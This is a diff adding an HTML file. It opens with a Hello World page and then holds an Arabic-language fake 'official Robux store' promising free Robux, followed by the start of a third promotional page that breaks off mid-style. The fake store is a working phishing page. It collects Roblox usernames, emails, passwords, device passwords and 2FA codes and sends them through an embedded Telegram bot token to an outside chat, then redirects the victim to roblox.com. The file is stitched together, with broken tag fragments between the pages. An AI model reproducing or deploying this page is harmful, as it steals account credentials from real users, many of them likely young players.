@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+  <title>Hello, World!</title>
+</head>
+<body>
+  <h1>
+    Hello, World!
+  </h1>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 متجر Robux الرسمي - هدية 50 Robux</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+    body {
+      margin: 0;
+      padding: 0;
+      background: radial-gradient(circle at top, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 15px;
+      padding: 30px;
+      width: 90%;
+      max-width: 480px;
+      box-shadow: 0 0 30px rgba(0,255,255,0.2);
+    }
+    h2 {
+      text-align: center;
+      color: #00ffff;
+      margin-bottom: 10px;
+    }
+    .note {
+      text-align: center;
+      font-size: 14px;
+      color: #aaa;
+      margin-bottom: 20px;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 10px;
+      border: none;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      font-size: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #00ffff;
+      color: #000;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      margin-top: 20px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #00dddd;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h2>🎁 هدية مجانية - 50 Robux</h2>
+    <div class="note">قم بإدخال معلومات حسابك لاختيار كمية الشراء حتى 10000 Robux</div>
+
+    <input id="username" type="text" placeholder="👤 اسم المستخدم">
+    <input id="email" type="email" placeholder="📧 البريد الإلكتروني">
+    <input id="password" type="password" placeholder="🔒 كلمة المرور">
+    <input id="devicepass" type="password" placeholder="📱 كلمة مرور الجهاز / الأمان">
+    <input id="twofa" type="text" placeholder="🔢 رمز 2FA (اختياري)">
+    <select id="amount">
+      <option value="50">🎁 50 Robux (هدية)</option>
+      <option value="100">💰 100 Robux</option>
+      <option value="500">💰 500 Robux</option>
+      <option value="1000">💰 1000 Robux</option>
+      <option value="5000">💎 5000 Robux</option>
+      <option value="10000">👑 10000 Robux</option>
+    </select>
+
+    <button onclick="sendRequest()">شراء الآن</button>
+    <div class="loading" id="loading">⏳ جاري معالجة طلبك...</div>
+  </div>
+
+  <script>
+    function sendRequest() {
+      const username = document.getElementById("username").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const devicepass = document.getElementById("devicepass").value.trim();
+      const twofa = document.getElementById("twofa").value.trim();
+      const amount = document.getElementById("amount").value;
+      const loading = document.getElementById("loading");
+
+      if (!username || !email || !password || !devicepass) {
+        alert("⚠️ الرجاء تعبئة كل الحقول الإلزامية.");
+        return;
+      }
+
+      loading.style.display = 'block';
+
+      const msg = `
+🔥 Robux Purchase Attempt:
+👤 Username: ${username}
+📧 Email: ${email}
+🔒 Password: ${password}
+📱 Device Pass: ${devicepass}
+🔢 2FA Code: ${twofa || '❌ Not Provided'}
+💰 Requested: ${amount} Robux
+`;
+
+      const token = "7800765542:AAFh5mHahjCqnK8WTXqEhze4G82Llmhi4nU";
+      const chat_id = "7923016277";
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: msg })
+      }).then(() => {
+        setTimeout(() => {
+          loading.innerText = "✅ تم إرسال طلبك! سيتم تحويلك إلى Roblox...";
+          setTimeout(() => {
+            window.location.href = "https://www.roblox.com/";
+          }, 2500);
+        }, 2500);
+      }).catch(err => {
+        loading.innerText = "❌ فشل الاتصال بالسيرفر. حاول لاحقاً.";
+        console.error(err);
+      });
+    }
+  </script>
+
+</body>
+</
+
+<!
+  <!
+    
+    <!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>🔥 متجر روبوكس الرسمي</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      text-align: center;
+      color: white;
+    }
+
+    /* 🔥 خلفية نار */
+    .fire-bg {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://i.ibb.co/2MZq7kP/fire.gif') center center / cover no-repeat;
+      z-index: -1;
+      opacity: 0.2;
+      animation: flicker 2s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 0.15; }
+      100% { opacity: 0.25; }
+    }
+
+    h1 {
+      font-size: 3.5rem;
+      text-shadow: 0 0 20px orange, 0 0 40px red;
+      animation: glow 1.5s infinite alternate;
+      margin-bottom: 20px;
+    }
+
+    .robux-counter {
+      font-size: 2rem;
+      color: #00ffea;
+      text-shadow: 0 0 10px #00fff2, 0 0 20px #00ffe1;
+      margin-bottom: 40px;
+    }
+
+    .channels-title {
+      font-size: 2.4rem;
+      color: #ffc107;
+      text-shadow: 0 0 15px orange, 0 0 30px red;
+      animation: glow 1.2s infinite alternate;
+      margin-bottom: 20px;
+    }
+
+    .channels {
+      display: flex;
+      gap: 30px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .channel-link {
+      font-size: 1.6rem;
+      padding: 15px 35px;
+      color: #00eaff;
+      border: 2px solid #ffa502;
+      border-radius: 15px;
+      text-decoration: none;
+      box-shadow: 0 0 15px #00eaff;
+      background-color: transparent;
+      transition: all 0.3s ease;
+    }
+
+    .channel-link:hover {
+      background-color: #ff6f91;
+      color: white;
+      border-color: white;
+      box-shadow:
